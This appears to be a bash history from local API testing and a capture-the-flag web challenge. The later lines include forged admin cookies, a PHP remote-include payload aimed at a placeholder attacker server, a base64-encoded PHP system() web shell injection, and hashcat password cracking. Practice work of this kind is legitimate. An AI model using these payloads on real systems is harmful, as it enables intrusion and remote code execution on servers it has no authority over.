bash autorun.sh
su
nano idor_scanner.py
python3 idor_scanner.py
nano idor_scanner.py
python3 idor_scanner.py
su
curl -u admin:secret http://localhost:5000/api/protegida
su
exit
sudo apt update && sudo apt upgrade -y
su
[200~/home/fap/fastapi-api~
/home/fap/fastapi-api
cd /home/fap/fastapi-api
ls
python3 main.py
source venv/bin/activate
pip install --upgrade pip
su
exit
curl -X POST -u admin:secret http://localhost:8001/api/login
curl -X POST -u admin:secret http://localhost:8002/api/login
clear
curl -X POST -u admin:secret http://localhost:8001/api/login
ss -tuln | grep 8001
nano api_fastapi.py
curl -u admin:secret -H "X-API-Key: my_secure_api_key_123" http://localhost:8000/api/protegida
clear
curl -u admin:secret -H "X-API-Key: my_secure_api_key_123" http://localhost:8000/api/protegida
curl -X POST -u admin:secret http://localhost:8000/api/login
curl -u admin:secret -H "X-API-Key: my_secure_api_key_123" http://localhost:8000/api/protegida
clear
curl -u admin:secret -H "X-API-Key: my_secure_api_key_123" http://localhost:8000/api/protegida
clear
curl -X POST -u admin:secret http://localhost:8000/api/login
clear
ps aux | grep uvicorn
curl -X POST -u admin:secret http://localhost:<port>/api/login
source /home/fap/venv-entrega2/bin/activate
uvicorn api_fastapi:app --host 0.0.0.0 --port 8000
uvicorn api_fastapi:app --host 0.0.0.0 --port 8001
uvicorn api_fastapi:app --host 0.0.0.0 --port 8002
uvicorn api_fastapi:app --host 0.0.0.0 --port 8000
su
htop
su
ls -la
nc own.ddlr.org:1337
nc own.ddlr.org 1337
hashcat -m 0 'b8ce9234d09af2342346b6a564xd5cb' /usr/share/wordlists/rockyou.txt
sudo apt update && sudo apt install hashcat -y
su
curl -X GET      -u admin:secret      -H "X-API-Key: my_secure_api_key_123"      -H "X-Forwarded-For: 127.0.0.1"      http://localhost:8001/api/protegida
python3 -m venv ~/venv-entrega2
source ~/venv-entrega2/bin/activate
su
nano main.py
su
curl -v -H "Cookie: administer=bba6c060e06b6984e0f8a397207582e4:admin" http://url-del-ctf/https://www.diosdelared.com/retos/empresa/
curl -v -H "Cookie: administer=bba6c060e06b6984e0f8a397207582e4:admin" https://www.diosdelared.com/retos/empresa/
curl -X POST -d "user=test&pass=test&kind=admin" https://www.diosdelared.com/retos/empresa/
curl -v -H "Cookie: administer=7df6a1a3dff9a81f1859a3b2c0a5e3a3:admin" https://www.diosdelared.com/retos/empresa/
echo -n "valhalla" | md5sum  # 7df6a1a3dff9a81f1859a3b2c0a5e3a3
curl -X POST -d "user=mateo&pass=1839&kind=admin" -H "Cookie: administer=$(echo -n 'admin' | md5sum | cut -d ' ' -f1):admin" https://www.diosdelared.com/retos/empresa/
curl https://www.diosdelared.com/retos/empresa/admin.php -v
# Intenta incluir un archivo remoto (si allow_url_include está habilitado en PHP)
curl -X POST -d "newfile=<?php include('http://tuservidor.com/check.php'); ?>" https://www.diosdelared.com/retos/empresa/
echo '<?php system("whoami"); ?>' | base64
curl -X POST -d "newfile=<?php eval(base64_decode('PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=')); ?>" https://www.diosdelared.com/retos/empresa/
su
curl -u admin:secret -H "X-API-Key: my_secure_api_key_123" http://localhost:5000/api/protegida
htop
ls -l
su
